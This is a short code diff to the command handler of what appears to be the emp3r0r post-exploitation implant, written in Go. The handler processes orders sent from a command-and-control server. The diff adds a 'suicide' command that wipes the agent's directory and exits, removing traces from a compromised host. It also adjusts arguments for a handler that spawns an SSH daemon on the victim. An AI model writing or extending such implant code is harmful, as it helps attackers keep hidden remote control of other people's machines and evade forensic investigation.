@@ -41,6 +41,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 	}
 
 	switch cmdSlice[0] {
+
 	/*
 		utils
 	*/
@@ -65,6 +66,16 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		// tell CC where to download the file
 		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s", emp3r0r_data.OpSep, strings.Join(cmdSlice, " "), emp3r0r_data.OpSep, out)
 		goto send
+
+	case "suicide":
+		if len(cmdSlice) != 1 {
+			return
+		}
+		err = os.RemoveAll(emp3r0r_data.AgentRoot)
+		if err != nil {
+			log.Fatalf("Failed to cleanup files")
+		}
+		os.Exit(0)
 
 		/*
 			fs commands
@@ -277,7 +288,7 @@ func processCCData(data *emp3r0r_data.MsgTunData) {
 		log.Printf("Got sshd request: %s", cmdSlice)
 		shell := cmdSlice[1]
 		port := cmdSlice[2]
-		args := cmdSlice[3 : len(cmdSlice)-1]
+		args := cmdSlice[3:]
 		go func() {
 			err = SSHD(shell, port, args)
 			if err != nil {
